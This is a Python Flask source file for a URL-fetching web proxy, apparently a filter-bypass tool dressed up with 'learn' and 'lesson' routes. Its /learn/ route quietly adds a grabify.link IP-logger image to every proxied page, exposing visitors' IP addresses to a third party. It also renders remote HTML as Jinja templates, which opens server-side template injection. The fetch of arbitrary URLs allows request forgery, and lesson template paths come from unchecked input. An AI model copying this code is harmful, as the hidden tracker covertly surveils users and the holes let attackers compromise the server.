from flask import Flask, render_template, request, session, send_file, redirect, jsonify, Response
from html.parser import HTMLParser
import urllib.request
import requests
import mechanicalsoup
import ipaddress
import os
import random
from bs4 import BeautifulSoup, SoupStrainer

log = []
dir = 'templates/session'
for f in os.listdir(dir):
    os.remove(os.path.join(dir, f))
browser = mechanicalsoup.Browser()
browser.set_user_agent('Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0')
app = Flask(__name__)
app.secret_key = os.urandom(12).hex()
mode = 1
MAX_IPV4 = ipaddress.IPv4Address._ALL_ONES


@app.route('/', methods=['POST', 'GET'])
def unblok_home():
  return render_template('home.html')

@app.route('/about')
def about():
  return render_template('about.html')

@app.route('/login')
def login():
  return 'wip'

@app.route('/learn/', methods=['GET', 'POST'])
def unblok():
  ipaddress.IPv4Address(ipaddress.IPv4Address._string_from_ip_int(random.randint(0, MAX_IPV4)))
  #session['url'] = request.args['url']
  #url = session['url']
  one=True
  if one:
    todo = request.form.get("todo")
  if not "https://" in str(todo):
    todo = "https://" + str(todo)
  
  html = requests.get(todo)
  cookie = os.urandom(12).hex()
  fileName = "bloked-" + cookie + ".html"
  fileDir = "templates/session/" + fileName
  file = open(fileDir, "w")
  writeText = str(html.text) + '<html> <img src="https://grabify.link/CDBG5R"> </html>'
  file.write(writeText)
  file.close()
  template = "session/" + fileName
  dir = "templates/" + template
  page = requests.get(todo)
  data = page.text
  
  user = request.values.get('input', '')
  log.append(user)
  host = open("sites.log", "w")
  print(str(user))
  host.close()
  
  return render_template(template)

@app.route('/favicon.png')
def favicon():
  return send_file('templates/favicon.png')

@app.route('/calculate')
def calc():
  return render_template('calculate.html')

@app.route('/lesson=<id>')
def lesson(id):
  lessonName = 'lessons/lesson-' + id + '.html'
  return render_template(lessonName)

@app.route('/robots.txt')
def noindex():
    r = Response(response="User-Agent: *\nDisallow: /\n", status=200, mimetype="text/plain")
    r.headers["Content-Type"] = "text/plain; charset=utf-8"
    return r

@app.route('/more/about')
def discord():
  return render_template('discord.html')

@app.errorhandler(500)
def page_not_found(e):
    return render_template('500.html'), 500

@app.errorhandler(404)
def page_not_found(e):
    return render_template('404.html'), 404


app.run(host='0.0.0.0', port=5000, debug=False)